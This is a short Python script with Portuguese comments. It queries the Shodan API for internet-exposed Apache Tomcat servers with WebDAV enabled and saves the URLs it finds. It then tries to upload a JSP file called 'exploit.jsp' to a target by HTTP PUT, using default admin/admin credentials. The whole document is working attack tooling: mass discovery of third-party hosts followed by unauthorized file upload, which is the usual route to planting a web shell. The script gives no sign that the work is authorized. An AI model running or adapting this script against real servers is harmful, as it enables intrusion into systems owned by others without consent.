import shodan
import requests
from requests.auth import HTTPBasicAuth

def buscar_tomcat_webdav(api_key, output_file="tomcat_webdav_vuln.txt"):
    try:
        api = shodan.Shodan(api_key)
        query = "Apache Tomcat WebDAV"  # Busca servidores Tomcat com WebDAV habilitado
        results = api.search(query)
        
        with open(output_file, "w") as f:
            for result in results["matches"]:
                ip = result["ip_str"]
                port = result["port"]
                url = f"http://{ip}:{port}/"
                
                f.write(url + "\n")
                print(f"Encontrado: {url}")
        
        print(f"Resultados salvos em {output_file}")
    except shodan.APIError as e:
        print(f"Erro na API do Shodan: {e}")

def explorar_webdav(target_url, username="admin", password="admin", file_path="exploit.jsp", file_content="<% out.println('Exploit Test'); %>"):
    try:
        full_url = target_url + file_path
        response = requests.request("PUT", full_url, data=file_content, auth=HTTPBasicAuth(username, password))
        
        if response.status_code in [200, 201, 204]:
            print(f"Exploit enviado com sucesso: {full_url}")
        else:
            print(f"Falha ao enviar exploit: {response.status_code}")
    except Exception as e:
        print(f"Erro ao explorar WebDAV: {e}")

if __name__ == "__main__":
    API_KEY = "SUA_SHODAN_API_KEY"  # Substitua pela sua chave de API do Shodan
    buscar_tomcat_webdav(API_KEY)
    
    # Exemplo de exploração após identificar um alvo
    TARGET_URL = "http://exemplo.com:8080/webdav/"  # Substitua por um alvo válido
    explorar_webdav(TARGET_URL)
